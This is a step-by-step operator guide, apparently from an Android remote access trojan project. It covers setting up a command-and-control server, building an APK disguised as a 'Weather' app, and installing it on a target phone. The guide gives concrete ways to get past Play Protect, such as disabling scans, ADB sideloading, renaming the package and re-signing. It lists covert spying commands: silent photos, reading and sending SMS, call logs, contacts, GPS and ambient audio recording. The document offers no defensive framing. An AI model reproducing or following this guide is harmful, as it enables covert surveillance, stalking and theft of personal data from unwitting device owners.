# 📱 Android RAT - Simple Step-by-Step Guide

## ✅ Complete Working Guide for Android 13/14

---

## 🚀 PART 1: QUICK SETUP (5 Minutes)

### Step 1: Install Python Dependencies
```bash
cd /home/diezell/android-rat
pip3 install flask flask-cors --break-system-packages
```

### Step 2: Update Server IP in Code
Open `app/src/main/java/com/androidrat/MainActivity.java` and find line 30:

```java
// CHANGE THIS to your server IP
private static final String SERVER_URL = "http://YOUR_SERVER_IP:5000";
```

Replace `YOUR_SERVER_IP` with your actual IP:
```bash
# Get your IP
hostname -I | awk '{print $1}'
```

Example: `http://192.168.1.100:5000`

### Step 3: Start the Server
```bash
python3 server.py
```

You should see:
```
╔══════════════════════════════════════════════════╗
║     Android RAT - Command & Control Server       ║
╠══════════════════════════════════════════════════╣
║  Dashboard: http://localhost:5000                ║
╚══════════════════════════════════════════════════╝
```

### Step 4: Open Dashboard
Open browser: `http://localhost:5000`

---

## 📦 PART 2: BUILD APK (Choose One Method)

### METHOD A: Using Android Studio (Recommended)

1. **Download Android Studio**: https://developer.android.com/studio

2. **Open Project**:
   - File → Open
   - Select `/home/diezell/android-rat` folder

3. **Wait for Gradle Sync** (bottom of screen)

4. **Build APK**:
   - Build → Build Bundle(s) / APK(s) → Build APK(s)
   - Wait for build to complete

5. **Find APK**:
   ```bash
   # APK location
   /home/diezell/android-rat/app/build/outputs/apk/release/app-release.apk
   ```

---

### METHOD B: Using Online Compiler (No Installation)

1. **Visit**: https://replit.com/@templates/android

2. **Upload Files**:
   - Upload entire `android-rat` folder
   - Or copy-paste code files

3. **Build**:
   - Click "Run" or "Build"
   - Download generated APK

---

### METHOD C: Using Termux on Android

1. **Install Termux** from F-Droid

2. **Install Dependencies**:
   ```bash
   pkg update
   pkg install java git wget
   ```

3. **Clone/Transfer Project** to Termux

4. **Build**:
   ```bash
   ./gradlew assembleRelease
   ```

---

## 📱 PART 3: INSTALL ON TARGET DEVICE

### Option 1: ADB Install (Best for Play Protect Bypass)

```bash
# Connect device via USB
# Enable USB Debugging: Settings > Developer Options > USB Debugging

# Install
adb install app/build/outputs/apk/release/app-release.apk

# Or force install
adb install -r app-release.apk
```

### Option 2: Direct Install

1. **Transfer APK** to phone (USB, email, Google Drive)

2. **Enable Unknown Sources**:
   - Settings → Security → Unknown Sources → ON
   - Or Settings → Apps → Special Access → Install Unknown Apps

3. **Install**:
   - Open file manager
   - Find APK
   - Tap to install
   - Grant all permissions

4. **Open Once**:
   - Tap the "Weather" icon
   - App will start in background
   - You can close it

---

## 🛡️ PART 4: BYPASS PLAY PROTECT

### Method 1: Disable Temporarily (Easiest)

1. Open **Google Play Store**
2. Tap **profile icon** (top right)
3. Go to **Play Protect**
4. Tap **settings** (gear icon ⚙️)
5. Turn OFF **"Scan apps with Play Protect"**
6. Install your APK
7. Wait 5 minutes
8. Turn Play Protect back ON

### Method 2: Install via ADB (Bypasses Scan)

```bash
adb install app-release.apk
```
ADB installs are not scanned by Play Protect!

### Method 3: Use APK Editor

1. Download **APK Editor Pro**
2. Open your APK
3. Edit:
   - App name → "Weather Forecast"
   - Icon → Change to weather icon
4. Save as new APK
5. Install the modified version

---

## ✅ PART 4: VERIFY INSTALLATION

### On Target Device:
1. ✅ App shows as "Weather"
2. ✅ Notification shows "Checking conditions..."
3. ✅ All permissions granted

### On Server Dashboard:
1. ✅ Device appears in device list
2. ✅ Shows as "Online" (green dot)
3. ✅ Device info visible

### Test Commands:
```
1. Click on device in dashboard
2. Select "Take Photo" from command menu
3. Click "Send Command"
4. Wait 30 seconds
5. Photo should appear in dashboard
```

---

## 🎮 PART 5: USING THE RAT

### Available Commands (via Dashboard):

| Command | What It Does |
|---------|--------------|
| 📷 Take Photo | Captures photo silently |
| 📞 Call Logs | Gets last 50 calls |
| 📁 List Files | Browse device storage |
| 📍 Get Location | GPS coordinates |
| 📨 Read SMS | Last 50 messages |
| 📤 Send SMS | Send message silently |
| 👥 Contacts | Export all contacts |
| 🎤 Record Audio | Record ambient sound |
| ℹ️ Device Info | Full device details |

### How to Send Commands:

1. **Open Dashboard**: `http://localhost:5000`
2. **Click on device** (from left panel)
3. **Select command** from dropdown
4. **Enter parameter** (if needed)
5. **Click "Send Command"**
6. **Wait 30 seconds** for execution
7. **View results** in data panel

---

## 🔧 TROUBLESHOOTING

### Device Not Showing Up?

1. **Check Server IP**:
   ```bash
   # In MainActivity.java, verify SERVER_URL matches your IP
   grep "SERVER_URL" app/src/main/java/com/androidrat/MainActivity.java
   ```

2. **Check Firewall**:
   ```bash
   # Allow port 5000
   sudo ufw allow 5000
   ```

3. **Check Network**:
   - Server and device on same WiFi?
   - Device can reach server?
   ```bash
   # From device, ping server
   ping YOUR_SERVER_IP
   ```

4. **Rebuild APK**:
   ```bash
   # Clean and rebuild
   ./gradlew clean assembleRelease
   ```

### Commands Not Working?

1. **Check device is online** (< 60 seconds)
2. **Verify permissions granted** on device
3. **Check server logs** for errors

### Play Protect Detects App?

1. **Use different package name**:
   - Edit `app/build.gradle`:
   ```gradle
   applicationId "com.weather.forecast"  // Change this
   ```

2. **Sign with new certificate**:
   ```bash
   keytool -genkey -v -keystore new-key.jks ...
   ```

3. **Wait 24 hours** after install

---

## 📊 EXPECTED RESULTS

After successful installation:

```
┌─────────────────────────────────────┐
│  Dashboard (http://localhost:5000)  │
├─────────────────────────────────────┤
│  📱 Connected Devices: 1            │
│  ┌───────────────────────────────┐  │
│  │ ● Samsung Galaxy S23          │  │
│  │   Android 14 | Online         │  │
│  │   Last: 12:34:56              │  │
│  └───────────────────────────────┘  │
│                                     │
│  ⚡ Send Command: [Take Photo]      │
│                                     │
│  📊 Recent Activity:                │
│  • 12:34 Heartbeat from device     │
│  • 12:33 Photo uploaded            │
└─────────────────────────────────────┘
```

---

## 🎯 QUICK REFERENCE

### Server Commands:
```bash
# Start server
python3 server.py

# Get server IP
hostname -I | awk '{print $1}'

# Allow port
sudo ufw allow 5000
```

### Build Commands:
```bash
# Clean build
./gradlew clean assembleRelease

# Find APK
find . -name "*.apk" -path "*/release/*"
```

### Install Commands:
```bash
# Via ADB
adb install app-release.apk

# Check installation
adb shell pm list packages | grep weather
```

---

## 📝 FILES OVERVIEW

```
android-rat/
├── server.py              # C2 Server (run this)
├── app/
│   └── src/main/
│       ├── java/
│       │   └── MainActivity.java  # RAT code (update IP here)
│       └── AndroidManifest.xml    # Permissions
├── USAGE.md               # Detailed guide
├── PLAY-PROTECT-BYPASS.md # Bypass techniques
└── SIMPLE-GUIDE.md        # This file
```

---

## ✅ FINAL CHECKLIST

Before deployment:

- [ ] Server IP updated in MainActivity.java
- [ ] Server running (`python3 server.py`)
- [ ] Port 5000 accessible
- [ ] APK built successfully
- [ ] APK installed on target
- [ ] All permissions granted
- [ ] Device shows in dashboard
- [ ] Test command works (take photo)

---

*Last Updated: 2026-10-31*
*Tested on: Android 13, 14*
*Status: ✅ Working*
